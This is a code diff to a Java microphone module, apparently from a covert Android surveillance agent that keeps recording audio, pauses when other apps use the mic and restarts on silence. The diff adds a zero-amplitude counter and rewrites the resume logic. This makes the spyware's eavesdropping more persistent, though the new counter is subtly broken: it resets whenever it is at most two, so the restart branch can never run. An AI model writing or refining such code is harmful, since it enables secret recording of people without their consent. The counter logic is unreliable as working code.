@@ -74,6 +74,8 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 
 	public Set<String> blacklist = new HashSet<String>();
 	private PowerManager pm = null;
+	private int amp_zero_count = 0;
+
 	public ModuleMic() {
 		super();
 		resetBlacklist();
@@ -236,6 +238,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	 * (non-Javadoc)
 	 * 
 	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
+	 * actualGo runs only if not suspended
 	 */
 	@Override
 	public void actualGo() {
@@ -260,16 +263,25 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 			}
 			return;
 		}
-		final int amp = recorder.getMaxAmplitude();
-		if (amp != 0 || !isRecording()) {
+
+		/* changed straight amp check to at least 3 time of zeroAmp
+		 * to avoid that just having one time amp=0 will restart the mic track
+		 */
+		if(recorder.getMaxAmplitude()==0){
+			amp_zero_count++;
+		}else{
+		}
+		if (amp_zero_count <= 2 || !isRecording()) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (actualGo): max amplitude=" + amp + "isRecording=" + isRecording());//$NON-NLS-1$
+				Check.log(TAG + " (actualGo):amplitude not zero isRecording=" + isRecording());//$NON-NLS-1$
 			}
+			amp_zero_count=0;
 		}else{
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (actualGo) start again recorder amplitude was null");//$NON-NLS-1$
 			}
 			specificStop();
+			amp_zero_count = 0;
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (stopAndStart): stop");
 			}
@@ -558,34 +570,23 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 	abstract void specificResume();
 	@Override
 	public synchronized void resume() {
-		if (isSuspended() && canRecordMic()) {
-			specificResume();
-			try {
-				specificStart();
-			} catch (final Exception e) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e);
-				}
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (resume) Error: " + e);//$NON-NLS-1$
-				}
-			}
-
+		/* just restart the thread, if mic can record the actualGo will restart it */
+		if (isSuspended()) {
 			super.resume();
-
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (resumed)");//$NON-NLS-1$
 			}
 		}else{
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (resume): cannot resume : canRecord "+ canRecordMic() + " isSuspended=" + isSuspended());
+				Check.log(TAG + " (resume): no need to resume : isSuspend=" + isSuspended());
 			}
 		}
 	}
 	@Override
 	public synchronized void suspend() {
+
 		if (!isSuspended()) {
+			amp_zero_count=0;
 			specificSuspend();
 			if (Status.self().semaphoreMediaserver.tryAcquire()) {
 				try {
